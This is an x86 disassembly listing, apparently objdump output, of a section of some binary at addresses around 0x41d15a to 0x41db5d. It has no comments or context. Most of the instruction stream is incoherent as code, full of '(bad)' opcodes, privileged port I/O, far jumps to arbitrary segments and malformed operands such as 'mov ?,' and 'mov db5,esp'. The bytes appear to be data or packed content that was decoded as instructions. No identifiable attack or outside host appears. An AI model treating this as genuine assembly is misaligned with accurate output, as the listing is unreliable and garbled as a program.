  41d15a:	fadd   QWORD PTR [ebp+0x58]
  41d15d:	adc    ch,dl
  41d15f:	push   ds
  41d160:	mov    BYTE PTR [edx+0x1ab138f8],cl
  41d166:	retf   0x73dd
  41d169:	or     DWORD PTR [edi+0x5cc2e6e0],ebx
  41d16f:	aam    0x1c
  41d171:	mov    esp,0xf881f745
  41d176:	neg    BYTE PTR [eax-0x4e902eb0]
  41d17c:	mov    al,0xc3
  41d17e:	push   ss
  41d17f:	popa   
  41d180:	push   ecx
  41d181:	add    bl,BYTE PTR [edi]
  41d183:	push   ebp
  41d184:	inc    esp
  41d185:	into   
  41d186:	push   0x75
  41d188:	test   ah,ah
  41d18a:	sbb    bl,BYTE PTR fs:[eax]
  41d18d:	push   esi
  41d18e:	out    dx,eax
  41d18f:	mov    bh,0x0
	...
  41d1f1:	add    BYTE PTR [eax],al
  41d1f3:	add    BYTE PTR [eax-0x3d],dl
  41d1f6:	cmp    ecx,DWORD PTR ds:0xdf76fdbb
  41d1fc:	xor    DWORD PTR [ebp-0x7],esp
  41d1ff:	hlt    
  41d200:	mov    bh,0x22
  41d202:	je     0x41d24f
  41d204:	fs xor eax,0x1040001
  41d20a:	add    BYTE PTR [eax],al
  41d20c:	shl    BYTE PTR [ebp-0x69],cl
  41d20f:	leave  
  41d210:	push   ebx
  41d211:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d212:	rcl    DWORD PTR [esi+0x5],cl
  41d215:	add    al,0xc
  41d217:	stos   BYTE PTR es:[edi],al
  41d218:	(bad)  
  41d219:	enter  0x8db7,0xc
  41d21d:	mov    ebx,0x5cf1d41e
  41d222:	add    esp,DWORD PTR [eax]
  41d224:	jbe    0x41d23f
  41d226:	call   0x7a4a:0x8aeff73b
  41d22d:	pop    ss
  41d22e:	push   0xffffffbf
  41d230:	add    ebx,DWORD PTR [eax-0x24]
  41d233:	aad    0x33
  41d235:	lods   eax,DWORD PTR ds:[esi]
  41d236:	in     al,0xce
  41d238:	pop    ds
  41d239:	dec    edi
  41d23a:	jno    0x41d2ac
  41d23c:	add    eax,0x7ea55b04
  41d242:	arpl   WORD PTR [ecx],dx
  41d244:	aam    0x87
  41d246:	mov    ecx,DWORD PTR [ebp+0x761f003c]
  41d24c:	add    ebx,ebx
  41d24e:	lods   eax,DWORD PTR ds:[esi]
  41d24f:	(bad)  
  41d250:	push   cs
  41d251:	icebp  
  41d252:	cmc    
  41d253:	add    al,0x87
  41d255:	dec    cx
  41d257:	fidiv  DWORD PTR [ecx+ebx*1+0x1240be6e]
  41d25e:	aam    0x72
  41d260:	sbb    esp,DWORD PTR [esi-0x4d]
  41d263:	pop    ss
  41d264:	xchg   esp,eax
  41d265:	mov    ebx,0xb2927b08
  41d26a:	mov    ah,0xe3
  41d26c:	push   ebx
  41d26d:	into   
  41d26e:	sub    al,0x2f
  41d270:	dec    ecx
  41d271:	jp     0x41d1fc
  41d273:	out    dx,eax
  41d274:	and    esp,DWORD PTR [eax+0x56]
  41d277:	shr    DWORD PTR [ebp-0x4a70fcf4],1
  41d27d:	mov    al,0x5f
  41d27f:	fimul  WORD PTR [esi+0xb26c5a1]
  41d285:	shl    DWORD PTR [esi],cl
  41d287:	mov    esp,esi
  41d289:	push   cs
  41d28a:	rcl    BYTE PTR [ebx],1
  41d28c:	pop    esp
  41d28d:	xor    edi,DWORD PTR [edx+0x24848891]
  41d293:	shl    DWORD PTR [edi+edi*1],cl
  41d296:	add    BYTE PTR [edi],cl
  41d298:	repnz xor DWORD PTR [ecx-0x12],esi
  41d29c:	and    BYTE PTR [ecx+ebp*2-0x17],dl
  41d2a0:	mov    ebx,0xe6161967
  41d2a5:	mov    esp,0xe274954c
  41d2aa:	cdq    
  41d2ab:	imul   ebp,DWORD PTR [esi],0xc4a71ef1
  41d2b1:	stc    
  41d2b2:	fcom   DWORD PTR ds:0xc7a72fe5
  41d2b8:	pop    es
  41d2b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d2ba:	dec    edx
  41d2bb:	xchg   esi,eax
  41d2bc:	(bad)  
  41d2bd:	sti    
  41d2be:	dec    ecx
  41d2bf:	jae    0x41d31c
  41d2c1:	push   ecx
  41d2c2:	push   ds
  41d2c3:	pop    esp
  41d2c4:	aaa    
  41d2c5:	mov    ds,WORD PTR [edx]
  41d2c7:	jle    0x41d2c7
  41d2c9:	pop    eax
  41d2ca:	push   ecx
  41d2cb:	inc    edi
  41d2cc:	cmp    eax,0xbef3e30e
  41d2d1:	mov    bh,0xd3
  41d2d3:	ja     0x41d2ce
  41d2d5:	jmp    0x41d352
  41d2d7:	or     ch,BYTE PTR [eax-0x25]
  41d2da:	dec    edi
  41d2db:	mov    BYTE PTR [eax],dh
  41d2dd:	mov    ebp,0x5b329922
  41d2e2:	js     0x41d2a6
  41d2e4:	mov    BYTE PTR [edi-0x5a],ah
  41d2e7:	scas   al,BYTE PTR es:[edi]
  41d2e8:	out    0xa7,eax
  41d2ea:	push   esp
  41d2eb:	stos   DWORD PTR es:[edi],eax
  41d2ec:	mov    al,0xfa
  41d2ee:	xor    DWORD PTR ds:0x3738f084,ebx
  41d2f4:	(bad)  
  41d2f6:	push   ecx
  41d2f7:	fistp  DWORD PTR [edi-0x4c]
  41d2fa:	fwait
  41d2fb:	cmp    DWORD PTR [edx+0x2be8932d],esp
  41d301:	call   0x119e:0x9242f1b9
  41d308:	add    edx,0x75fdb343
  41d30e:	or     BYTE PTR [ebp+0x0],0x0
	...
  41d371:	add    BYTE PTR [eax],al
  41d373:	add    dh,bh
  41d375:	cmp    cl,0x54
  41d378:	(bad)  
  41d379:	jge    0x41d37a
  41d37b:	stos   BYTE PTR es:[edi],al
  41d37c:	lea    ebp,[edi]
  41d37e:	shr    BYTE PTR [ecx-0x5],0xf0
  41d382:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d383:	or     ebp,DWORD PTR [eax+0x36]
  41d386:	add    DWORD PTR [eax],eax
  41d388:	add    al,0x1
  41d38a:	add    BYTE PTR [eax],al
  41d38c:	in     eax,dx
  41d38d:	mov    eax,ds:0x6a6bb875
  41d392:	mov    eax,0xfc8304de
  41d397:	stos   DWORD PTR es:[edi],eax
  41d398:	xor    BYTE PTR [eax-0x35],dh
  41d39b:	(bad)  
  41d39e:	out    0x0,eax
  41d3a0:	mov    edx,0x3152c005
  41d3a5:	(bad)  
  41d3a6:	mov    ebx,0xc5296442
  41d3ab:	jg     0x41d3ac
  41d3ad:	xchg   ecx,eax
  41d3ae:	push   0x3b
  41d3b0:	inc    BYTE PTR [esi]
  41d3b2:	xchg   edx,eax
  41d3b3:	ds push ds
  41d3b5:	clc    
  41d3b6:	xchg   edx,eax
  41d3b7:	cdq    
  41d3b8:	(bad)  
  41d3b9:	test   BYTE PTR [eax+0x4ba4d485],0xb9
  41d3c0:	fmul   QWORD PTR [eax+0x2d]
  41d3c3:	mov    esi,0x218cffa3
  41d3c8:	add    bl,BYTE PTR [eax-0x60]
  41d3cb:	mov    ah,ah
  41d3cd:	xlat   BYTE PTR ds:[ebx]
  41d3ce:	adc    eax,0xba6ef225
  41d3d3:	test   DWORD PTR [ecx],eax
  41d3d5:	gs es cli 
  41d3d8:	sbb    al,0x38
  41d3da:	jo     0x41d3a5
  41d3dc:	mov    esi,DWORD PTR [ecx+0x4a]
  41d3df:	out    0xd7,eax
  41d3e1:	das    
  41d3e2:	scas   al,BYTE PTR es:[edi]
  41d3e3:	int3   
  41d3e4:	add    al,0x3e
  41d3e6:	xchg   ebp,eax
  41d3e7:	outs   dx,DWORD PTR ds:[esi]
  41d3e8:	sar    DWORD PTR [ecx+0x21a796fc],cl
  41d3ee:	(bad)  
  41d3ef:	cs aad 0x2a
  41d3f2:	(bad)  
  41d3f3:	and    esp,DWORD PTR [ebp+0x1f23ceef]
  41d3f9:	(bad)  
  41d3fa:	push   edx
  41d3fb:	mov    ah,0x13
  41d3fd:	fsubr  DWORD PTR [esi+0x1742cdeb]
  41d403:	repnz adc BYTE PTR [esi],bl
  41d406:	sar    BYTE PTR [edx],0xd1
  41d409:	lds    ebp,FWORD PTR [ebp+0x6b]
  41d40c:	fild   WORD PTR [eax-0x22427a28]
  41d412:	inc    edx
  41d413:	sub    eax,0xcbd0d434
  41d418:	sbb    eax,0x2b197a6a
  41d41d:	dec    edi
  41d41e:	xchg   ebx,eax
  41d41f:	out    dx,al
  41d420:	adc    al,BYTE PTR ds:0x5e68b7d3
  41d426:	xchg   esi,eax
  41d427:	mov    bh,0x95
  41d429:	push   ds
  41d42a:	bound  edx,QWORD PTR [edi+ecx*8+0x222e9246]
  41d431:	xchg   edi,eax
  41d432:	add    al,0xfa
  41d434:	ror    bl,cl
  41d436:	xchg   BYTE PTR [ecx],dl
  41d438:	mov    DWORD PTR [edx],edi
  41d43a:	mov    ebp,0x3f35b979
  41d43f:	jne    0x41d491
  41d441:	(bad)  [ebp+0x45b3126a]
  41d447:	jmp    0x4a2900dc
  41d44c:	inc    edx
  41d44d:	sub    DWORD PTR [edx],esi
  41d44f:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  41d451:	cmp    al,0x8
  41d453:	int3   
  41d454:	fcomp  DWORD PTR [ecx]
  41d456:	mov    bh,0xcc
  41d458:	mov    ds:0x562b1426,al
  41d45d:	retf   
  41d45e:	cmp    al,0x4d
  41d460:	mov    edx,ecx
  41d462:	test   DWORD PTR [bx+di+0x47dc],ecx
  41d467:	xchg   esp,eax
  41d468:	inc    esi
  41d469:	xor    al,0x7c
  41d46b:	xchg   ecx,eax
  41d46c:	fwait
  41d46d:	adc    eax,0xd1aa5ee1
  41d472:	ins    BYTE PTR es:[edi],dx
  41d473:	mov    WORD PTR [edx+0x49],gs
  41d476:	adc    cl,BYTE PTR [ebx+0x19fdb424]
  41d47c:	cmp    al,0x3
  41d47e:	call   0x1582d1c4
  41d483:	pop    ss
  41d484:	inc    esi
  41d485:	mov    edx,0xe0f70d29
  41d48a:	in     al,0x6b
  41d48c:	and    eax,0xdcbd1
	...
  41d4f1:	add    BYTE PTR [eax],al
  41d4f3:	add    dh,dh
  41d4f5:	rcl    BYTE PTR ss:[edx+edx*8+0x7d76f6f4],cl
  41d4fd:	nop
  41d4fe:	call   0x6c3a:0x17672689
  41d505:	aaa    
  41d506:	add    DWORD PTR [eax],eax
  41d508:	add    al,0x1
  41d50a:	add    BYTE PTR [eax],al
  41d50c:	dec    bp
  41d50e:	shl    BYTE PTR [ebp-0x720acb9c],cl
  41d514:	aas    
  41d515:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d516:	mov    BYTE PTR [ebp+0x719de932],al
  41d51c:	hlt    
  41d51d:	adc    eax,0x6db3fa8f
  41d522:	jne    0x41d4e0
  41d524:	adc    BYTE PTR [edi+esi*1+0x6b],0xe9
  41d529:	mov    cl,0x37
  41d52b:	loopne 0x41d5a5
  41d52d:	(bad)  
  41d52e:	(bad)  
  41d52f:	lods   eax,DWORD PTR ds:[esi]
  41d530:	mov    eax,ds:0x506d74af
  41d535:	stos   DWORD PTR es:[edi],eax
  41d536:	fistp  QWORD PTR [ebp-0x7]
  41d539:	jge    0x41d592
  41d53b:	sbb    eax,0x79995cd7
  41d540:	mov    dh,0x92
  41d542:	int3   
  41d543:	mov    esi,0x8f533e2a
  41d548:	xchg   ebp,eax
  41d549:	cs imul esp,edi,0x5290d030
  41d550:	pop    ebp
  41d551:	xor    eax,0x4235647d
  41d556:	jmp    0xb5e3:0x86db8ab6
  41d55d:	add    ebp,DWORD PTR [ebx]
  41d55f:	add    ecx,DWORD PTR [esi-0x45a47eb8]
  41d565:	repnz adc DWORD PTR [ebp-0x16159974],edi
  41d56c:	leave  
  41d56d:	aam    0xda
  41d56f:	out    dx,al
  41d570:	mov    edx,0xcfe07755
  41d575:	or     BYTE PTR [ebx],al
  41d577:	cmp    BYTE PTR [ebp-0x15163bd3],ch
  41d57d:	in     eax,dx
  41d57e:	in     al,0x91
  41d580:	pusha  
  41d581:	push   edx
  41d582:	inc    BYTE PTR [edx-0x2c2dc4b0]
  41d588:	lods   al,BYTE PTR ds:[esi]
  41d589:	(bad)
  41d58e:	shl    DWORD PTR [eax],1
  41d590:	data16 xor ch,BYTE PTR [edi]
  41d593:	fidivr DWORD PTR [ecx+0x527058e4]
  41d599:	dec    edi
  41d59a:	mov    edi,0xd5914bfe
  41d59f:	push   0xffffff80
  41d5a1:	or     esp,0xdcddee83
  41d5a7:	push   ds
  41d5a8:	inc    eax
  41d5a9:	dec    esi
  41d5aa:	retf   
  41d5ab:	retf   
  41d5ac:	cwde   
  41d5ad:	jl     0x41d5c4
  41d5af:	mov    WORD PTR ds:0x31d857b6,ds
  41d5b5:	pop    ebp
  41d5b6:	fiadd  WORD PTR [edi+0x61]
  41d5b9:	into   
  41d5ba:	vcvtss2sd xmm2,xmm3,xmm4
  41d5be:	cwde   
  41d5bf:	(bad)  
  41d5c0:	rol    DWORD PTR [esi],0xdb
  41d5c3:	ds out dx,eax
  41d5c5:	stos   BYTE PTR es:[edi],al
  41d5c6:	jne    0x41d60d
  41d5c8:	sub    eax,DWORD PTR [eax+ebp*2-0x7d]
  41d5cc:	mov    ebx,0x5a647905
  41d5d1:	mov    bh,0xfb
  41d5d3:	pop    ecx
  41d5d4:	sahf   
  41d5d5:	push   ds
  41d5d6:	call   0x598d:0xbd5d4a83
  41d5dd:	adc    al,0x46
  41d5df:	fistp  QWORD PTR [edi-0x7d]
  41d5e2:	dec    ebp
  41d5e3:	mov    bl,0x4b
  41d5e5:	loop   0x41d588
  41d5e7:	dec    edi
  41d5e8:	(bad)  
  41d5ea:	xchg   ebx,eax
  41d5eb:	sub    cl,BYTE PTR [edi+0x8]
  41d5ee:	repnz inc eax
  41d5f0:	and    al,0x51
  41d5f2:	and    DWORD PTR [esp+edi*1+0xdfd8bb3],0xfffffff4
  41d5fa:	fnsave [ecx-0x7b]
  41d5fd:	test   al,0x58
  41d5ff:	cld    
  41d600:	xchg   BYTE PTR [ecx+0x7f33509c],cl
  41d606:	mov    bl,0x5c
  41d608:	push   ebp
  41d609:	dec    eax
  41d60a:	xor    al,dl
  41d60c:	dec    esi
  41d60d:	imul   ebp,DWORD PTR [esi+0x26],0x0
	...
  41d674:	jl     0x41d60f
  41d676:	dec    esp
  41d677:	jbe    0x41d666
  41d679:	idiv   DWORD PTR [esi-0x65]
  41d67c:	or     eax,0xff66e435
  41d681:	lods   al,BYTE PTR ds:[esi]
  41d682:	jmp    0x17a4700
  41d687:	add    BYTE PTR [ecx+eax*1],al
  41d68a:	add    BYTE PTR [eax],al
  41d68c:	xor    bl,BYTE PTR [eax-0x58]
  41d68f:	xor    esi,DWORD PTR [edi+0x32]
  41d692:	add    eax,0xfab898b
  41d697:	rcl    bl,0xd
  41d69a:	dec    edx
  41d69b:	sar    DWORD PTR [ebx-0x664490d4],1
  41d6a1:	and    ecx,DWORD PTR [ecx]
  41d6a3:	and    eax,0x11adbea8
  41d6a8:	pop    ebx
  41d6a9:	shr    cl,0xa6
  41d6ac:	mov    BYTE PTR [esi-0x3],ch
  41d6af:	xchg   ebp,eax
  41d6b0:	xor    ch,al
  41d6b2:	or     BYTE PTR [esi+0x69450fde],dh
  41d6b8:	dec    eax
  41d6b9:	lea    esp,[edi-0x5a858cb3]
  41d6bf:	iret   
  41d6c0:	jecxz  0x41d69c
  41d6c2:	pop    edi
  41d6c3:	adc    ch,BYTE PTR [ebx-0x324767cf]
  41d6c9:	ret    0x40e6
  41d6cc:	inc    esi
  41d6cd:	and    al,0x87
  41d6cf:	pop    edi
  41d6d0:	test   eax,0x25b35b30
  41d6d5:	int3   
  41d6d6:	enter  0xd0dc,0x8f
  41d6da:	je     0x41d6c0
  41d6dc:	nop
  41d6dd:	jae    0x41d6dc
  41d6df:	sbb    BYTE PTR [ecx+0x72],ch
  41d6e2:	cmp    ah,BYTE PTR [edx+0x66]
  41d6e5:	jo     0x41d740
  41d6e7:	xchg   DWORD PTR [edi+0x57],eax
  41d6ea:	mov    esi,DWORD PTR [edi-0x72]
  41d6ed:	or     ebx,edi
  41d6ef:	fadd   st(4),st
  41d6f1:	popa   
  41d6f2:	sub    ecx,DWORD PTR [eax+edi*1+0x2]
  41d6f6:	ja     0x41d763
  41d6f8:	dec    esp
  41d6f9:	call   0x3112f135
  41d6fe:	ja     0x41d718
  41d700:	dec    edi
  41d701:	pop    eax
  41d702:	int3   
  41d703:	jae    0x41d737
  41d705:	jmp    0x41d6ac
  41d707:	dec    esp
  41d708:	dec    edx
  41d709:	jmp    0x41d703
  41d70b:	pop    es
  41d70c:	cli    
  41d70d:	bound  edi,QWORD PTR [esi-0x18]
  41d710:	push   eax
  41d711:	sub    BYTE PTR [esi+0x26d6cf23],ch
  41d717:	xchg   esp,eax
  41d718:	pop    ecx
  41d719:	(bad)  [esi]
  41d71b:	js     0x41d787
  41d71d:	mov    dh,0xcf
  41d71f:	xlat   BYTE PTR ds:[ebx]
  41d720:	mov    dl,ah
  41d722:	mov    esi,0xa7ce97a6
  41d727:	adc    DWORD PTR [edx+0x5c],ecx
  41d72a:	les    ecx,FWORD PTR [eax+0x3c]
  41d72d:	fnstcw WORD PTR ds:0xf8fdeb51
  41d733:	cli    
  41d734:	adc    esi,esp
  41d736:	inc    ebp
  41d737:	push   eax
  41d738:	xor    cl,dh
  41d73a:	call   0x3f44f6a7
  41d73f:	test   BYTE PTR [esi+0x1611ca02],dh
  41d745:	jg     0x41d6f0
  41d747:	stos   BYTE PTR es:[edi],al
  41d748:	outs   dx,DWORD PTR ds:[esi]
  41d749:	ss jmp 0x41d763
  41d74c:	dec    ebx
  41d74d:	dec    esp
  41d74e:	fisub  WORD PTR [edi+0x5f03d8c1]
  41d754:	pop    esi
  41d755:	imul   edi,DWORD PTR [edi-0x25],0x4
  41d759:	sti    
  41d75a:	test   eax,0x5ebe9b12
  41d75f:	inc    esi
  41d760:	cs cmp ah,0xb2
  41d764:	cmc    
  41d765:	mov    bh,0x13
  41d767:	mov    bl,0x44
  41d769:	push   0xc8dd564a
  41d76e:	mov    BYTE PTR [ebp+ebp*4+0x141f8e20],dl
  41d775:	sbb    eax,0xd968f326
  41d77a:	and    esp,0xc574316f
  41d780:	es gs inc esi
  41d783:	inc    esi
  41d784:	jl     0x41d790
  41d786:	pushf  
  41d787:	ins    DWORD PTR es:[edi],dx
  41d788:	mov    dl,0x3
  41d78a:	xchg   ebx,eax
  41d78b:	mov    esi,0x581e265a
	...
  41d7f4:	and    al,0xce
  41d7f6:	outs   dx,BYTE PTR ds:[esi]
  41d7f7:	sub    ch,dh
  41d7f9:	stos   BYTE PTR es:[edi],al
  41d7fa:	fs into 
  41d7fc:	jmp    0x41d789
  41d7fe:	leave  
  41d7ff:	aas    
  41d800:	adc    DWORD PTR ds:0x3974fe76,edi
  41d806:	add    DWORD PTR [eax],eax
  41d808:	add    al,0x1
  41d80a:	add    BYTE PTR [eax],al
  41d80c:	mov    bl,0x8b
  41d80e:	stos   BYTE PTR es:[edi],al
  41d80f:	call   0x7aca:0xfbb255ae
  41d816:	stos   BYTE PTR es:[edi],al
  41d817:	inc    ebx
  41d818:	xchg   edi,eax
  41d819:	lock or BYTE PTR [esp+ebp*1+0x4e415b8e],dh
  41d821:	repz mov dh,0xfb
  41d824:	xor    esi,esp
  41d826:	or     esp,DWORD PTR [ebp-0x40]
  41d829:	sbb    BYTE PTR [edi],bl
  41d82b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d82c:	pop    ebp
  41d82d:	push   ebp
  41d82e:	js     0x41d7e4
  41d830:	jno    0x41d87a
  41d832:	sbb    edx,DWORD PTR [eax]
  41d834:	push   0x0
  41d836:	pop    eax
  41d837:	mov    DWORD PTR [eax+eiz*2-0x5a],eax
  41d83b:	pop    ebp
  41d83c:	mov    bh,0xd6
  41d83e:	sub    ebx,DWORD PTR [ecx-0x13]
  41d841:	jbe    0x41d8c1
  41d843:	inc    edx
  41d844:	fiadd  DWORD PTR [ebp+0x126d4049]
  41d84a:	dec    esi
  41d84b:	sub    bl,bl
  41d84d:	out    0xe2,eax
  41d84f:	pop    esp
  41d850:	cli    
  41d851:	push   ecx
  41d852:	push   ebp
  41d853:	aad    0xf5
  41d855:	iret   
  41d856:	sub    BYTE PTR [edx+0x69],bh
  41d859:	mov    ah,0x4d
  41d85b:	mov    ds:0x50092e93,eax
  41d860:	lock mov ecx,0xbf2a8070
  41d866:	dec    ecx
  41d867:	in     al,0x4a
  41d869:	rcr    BYTE PTR [ebx+0x6f],1
  41d86c:	mov    bl,0x9b
  41d86e:	lahf   
  41d86f:	test   DWORD PTR [ecx+0x6],eax
  41d872:	mov    edi,0xdf0c414b
  41d877:	stos   BYTE PTR es:[edi],al
  41d878:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d879:	jecxz  0x41d8a2
  41d87b:	cmp    edx,DWORD PTR [ecx-0x4f1115c4]
  41d881:	and    cl,dh
  41d883:	cwde   
  41d884:	pop    ebx
  41d885:	jbe    0x41d8fc
  41d887:	jge    0x41d84c
  41d889:	push   0xf
  41d88b:	scas   al,BYTE PTR es:[edi]
  41d88c:	out    0x33,al
  41d88e:	push   ds
  41d88f:	xor    ecx,ebx
  41d891:	mov    eax,DWORD PTR [eax-0x5cc3f0e9]
  41d897:	hlt    
  41d898:	mov    fs,WORD PTR [ebx+0x4f]
  41d89b:	pop    eax
  41d89c:	inc    esp
  41d89d:	loope  0x41d8ce
  41d89f:	retf   
  41d8a0:	lock sbb al,0xf3
  41d8a3:	jle    0x41d906
  41d8a5:	xor    DWORD PTR [ecx],esi
  41d8a7:	fwait
  41d8a8:	clc    
  41d8a9:	and    DWORD PTR [ebx+edi*2+0x6dd08932],edi
  41d8b0:	lds    eax,FWORD PTR [edi]
  41d8b2:	popf   
  41d8b3:	(bad)
  41d8b7:	cmp    BYTE PTR [eax],ch
  41d8b9:	cmp    ecx,ecx
  41d8bb:	retf   
  41d8bc:	ret    0x964e
  41d8bf:	sbb    al,0xea
  41d8c1:	stos   BYTE PTR es:[edi],al
  41d8c2:	push   0x34
  41d8c4:	lahf   
  41d8c5:	inc    ebp
  41d8c7:	cmp    al,0xfc
  41d8c9:	fs jnp 0x41d8e7
  41d8cc:	jne    0x41d888
  41d8ce:	cmc    
  41d8cf:	test   BYTE PTR [ebx+eiz*8],dh
  41d8d2:	cli    
  41d8d3:	mov    dl,0x24
  41d8d5:	xchg   ecx,eax
  41d8d6:	out    0xed,al
  41d8d8:	out    0x38,eax
  41d8da:	dec    edx
  41d8db:	add    dh,0xcf
  41d8de:	mov    ds:0xd573613a,eax
  41d8e3:	xor    eax,0x644ecb17
  41d8e8:	mov    ah,0xd7
  41d8ea:	jmp    0xa300adf7
  41d8ef:	dec    eax
  41d8f0:	jnp    0x41d8d5
  41d8f2:	enter  0x45a3,0x65
  41d8f6:	out    0x71,al
  41d8f8:	inc    ecx
  41d8f9:	or     BYTE PTR [edx+0x38bb9e80],ch
  41d8ff:	xchg   edx,eax
  41d900:	in     al,0x7a
  41d902:	fs jge 0x41d886
  41d905:	ins    BYTE PTR es:[edi],dx
  41d906:	mov    db5,esp
  41d909:	imul   esp
  41d90b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d90c:	push   ds
  41d90d:	xchg   edi,eax
  41d90e:	bound  esp,QWORD PTR [eax+eax*1]
	...
  41d971:	add    BYTE PTR [eax],al
  41d973:	add    ah,al
  41d975:	ins    BYTE PTR es:[edi],dx
  41d976:	pop    es
  41d977:	pushf  
  41d978:	scas   eax,DWORD PTR es:[edi]
  41d979:	(bad)  
  41d97a:	fistp  QWORD PTR [esp+ebx*8-0x4e]
  41d97e:	outs   dx,DWORD PTR ds:[esi]
  41d97f:	repnz fnstsw WORD PTR gs:[edx+0x43]
  41d984:	js     0x41d9c0
  41d986:	add    DWORD PTR [eax],eax
  41d988:	add    al,0x1
  41d98a:	add    BYTE PTR [eax],al
  41d98c:	mov    DWORD PTR [ecx],edi
  41d98e:	mov    cl,0x3d
  41d990:	cmp    edi,DWORD PTR [ecx+0x1d]
  41d993:	mov    ds:0xd92694de,eax
  41d998:	inc    ecx
  41d999:	push   esp
  41d99a:	enter  0xf484,0x50
  41d99e:	adc    dh,BYTE PTR [eax]
  41d9a0:	adc    DWORD PTR [eax-0x16d4b6d4],0xec9c3dc8
  41d9aa:	fidivr WORD PTR [edi-0x64]
  41d9ad:	add    ecx,esi
  41d9af:	arpl   WORD PTR [ebp+esi*8+0x7],di
  41d9b3:	xchg   ecx,ebx
  41d9b5:	mov    ebp,DWORD PTR [edx]
  41d9b7:	adc    BYTE PTR [ecx+0x1664f3d7],bl
  41d9bd:	sub    ch,dl
  41d9bf:	js     0x41d964
  41d9c1:	int3   
  41d9c2:	aaa    
  41d9c3:	js     0x41d9ea
  41d9c5:	outs   dx,DWORD PTR ds:[esi]
  41d9c6:	pop    edi
  41d9c7:	retf   
  41d9c8:	adc    DWORD PTR [edi],ecx
  41d9ca:	hlt    
  41d9cb:	out    0x44,eax
  41d9cd:	popf   
  41d9ce:	pop    ds
  41d9cf:	sub    DWORD PTR [esi-0x2a4b59d6],edx
  41d9d5:	gs sub al,0xf6
  41d9d8:	push   ebp
  41d9d9:	lds    eax,FWORD PTR [esi-0x3bd97e04]
  41d9df:	adc    bh,BYTE PTR [ecx]
  41d9e1:	enter  0x89ee,0xd0
  41d9e5:	loopne 0x41d9f7
  41d9e7:	and    dh,BYTE PTR [edi]
  41d9e9:	in     al,0x41
  41d9eb:	scas   eax,DWORD PTR es:[edi]
  41d9ec:	and    DWORD PTR [eax],0xffffffc5
  41d9ef:	outs   dx,BYTE PTR ds:[esi]
  41d9f0:	xor    al,0x90
  41d9f2:	fdiv   QWORD PTR [edx]
  41d9f4:	cli    
  41d9f5:	sar    esi,0xfc
  41d9f8:	cwde   
  41d9f9:	mov    ebp,DWORD PTR [ebx]
  41d9fb:	mov    bl,BYTE PTR [ebx+ebp*4+0x65dc467e]
  41da02:	sbb    edx,edx
  41da04:	fisttp WORD PTR [eax]
  41da06:	xchg   edx,eax
  41da07:	cdq    
  41da08:	cmp    al,0x96
  41da0a:	jmp    0xd4628546
  41da0f:	int3   
  41da10:	mov    eax,ds:0x70f65f6e
  41da15:	cmp    eax,0x528c9ab4
  41da1a:	adc    eax,0xb983abf9
  41da1f:	jmp    0xf0d173c5
  41da24:	sub    edx,DWORD PTR [ebx-0x1139283b]
  41da2a:	mov    cl,bh
  41da2c:	mov    WORD PTR gs:[esi],fs
  41da2f:	pop    ebx
  41da30:	das    
  41da31:	dec    esi
  41da32:	cmc    
  41da33:	sahf   
  41da34:	xor    al,0x63
  41da36:	loop   0x41d9c5
  41da38:	inc    esp
  41da39:	mov    BYTE PTR [esp+edi*2],bl
  41da3c:	inc    eax
  41da3d:	(bad)  [ebp+0xf8e015f]
  41da43:	pusha  
  41da44:	xor    al,0xa0
  41da46:	jo     0x41d9da
  41da48:	jnp    0x41d9e5
  41da4a:	and    al,0x1
  41da4c:	push   eax
  41da4d:	pop    ebp
  41da4e:	xchg   DWORD PTR [eax],ebp
  41da50:	lock mov edi,DWORD PTR [edi+ebp*4-0x7d]
  41da55:	cmp    DWORD PTR [ebp+0x23adf140],edx
  41da5b:	leave  
  41da5c:	jns    0x41dad6
  41da5e:	dec    ch
  41da60:	popf   
  41da61:	scas   al,BYTE PTR es:[edi]
  41da62:	out    0xca,eax
  41da64:	jns    0x41da98
  41da66:	sahf   
  41da67:	scas   al,BYTE PTR es:[edi]
  41da68:	mov    edi,0x4b1693c1
  41da6d:	dec    esi
  41da6e:	cs sbb eax,0x5f58c00a
  41da74:	ss iret 
  41da76:	cmp    BYTE PTR [edx-0x6fe1de8e],0xab
  41da7d:	jmp    0x41da1f
  41da7f:	adc    BYTE PTR [eax-0x7529fe18],al
  41da85:	mov    ?,WORD PTR [eax+eax*4-0x363a0542]
  41da8c:	xchg   ebx,eax
  41da8d:	mov    DWORD PTR [edx+0x87],edi
	...
  41daf3:	add    BYTE PTR [edx*1+0x7f7b537b],bl
  41dafa:	cmp    al,0x5f
  41dafc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dafd:	push   edi
  41dafe:	sbb    ebp,0xffffffa3
  41db01:	and    eax,0x3b7cb0b6
  41db06:	add    DWORD PTR [eax],eax
  41db08:	add    al,0x1
  41db0a:	add    BYTE PTR [eax],al
  41db0c:	jns    0x41daf2
  41db0e:	pop    esp
  41db0f:	jmp    0x9d13:0x9360a90a
  41db16:	ror    edi,cl
  41db18:	xor    al,0x3f
  41db1a:	xchg   esp,eax
  41db1b:	ins    BYTE PTR es:[edi],dx
  41db1c:	mov    esp,0xc68c5b9
  41db21:	or     edx,edi
  41db23:	fisttp WORD PTR [ebx]
  41db25:	jp     0x41db90
  41db27:	cmp    BYTE PTR [ebp+0x7b],dh
  41db2a:	in     eax,0x7d
  41db2c:	mov    cl,0xb9
  41db2e:	cmp    al,0x23
  41db30:	inc    edx
  41db31:	mov    esi,0xbf9dedcf
  41db36:	or     eax,0xdd5b4aab
  41db3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41db3c:	and    esp,DWORD PTR [esi]
  41db3e:	(bad)  
  41db3f:	sbb    DWORD PTR [ebx],esp
  41db41:	inc    esp
  41db42:	into   
  41db43:	sti    
  41db44:	enter  0xe0dd,0x3d
  41db48:	in     eax,0xb9
  41db4a:	retf   
  41db4b:	daa    
  41db4c:	ds fucomip st,st(1)
  41db4f:	shl    BYTE PTR [ecx+esi*8-0x63e587c0],1
  41db56:	mov    ecx,0x6fbcdf83
  41db5b:	clc    
  41db5c:	push   edx
  41db5d:	pop    ebx
